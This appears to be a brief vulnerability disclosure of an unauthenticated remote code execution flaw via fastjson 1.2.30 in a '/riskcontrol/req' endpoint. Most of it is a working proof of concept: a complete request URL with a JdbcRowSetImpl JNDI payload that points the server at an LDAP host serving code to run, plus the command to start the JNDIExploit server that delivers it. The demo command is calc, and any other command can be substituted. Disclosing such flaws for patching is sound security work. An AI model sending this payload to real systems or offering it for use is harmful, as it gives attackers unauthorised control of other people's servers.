The system uses fastjson 1.2.30, and this component has an RCE vulnerability.
![image](https://github.com/haioudelibaiyi/CVE/blob/main/img/1.png)
Through analysis, it was found that /riskcontrol/req called the methods in the EventFactory class. The build in the EventFactory class receives json parameters, and the interface can be accessed without authorization. The scene field in the json parameters is not empty. And scene=LOGIN triggers Json.parseObject (json, LoginEvent.class); Vulnerability point
pyaload:
http://ip/riskcontrol/req?json={"scene":"LOGIN","c":{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://0.0.0.0:1389/Basic/Command/calc","autoCommit":true}}}
![image](https://github.com/haioudelibaiyi/CVE/blob/main/img/2.png)
![image](https://github.com/haioudelibaiyi/CVE/blob/main/img/3.png)
![image](https://github.com/haioudelibaiyi/CVE/blob/main/img/5.png)

Using the JNDIExploit-2.0-SNAPSHOT.jar tool, java-jar jndiexploit-2.0-snapshot.jar-i 127.0.0.1, with the payload being, commands can be executed on the system, such as the calc command.
java -jar JNDIExploit-2.0-SNAPSHOT.jar  -i 0.0.0.0  
![image](https://github.com/haioudelibaiyi/CVE/blob/main/img/4.png)
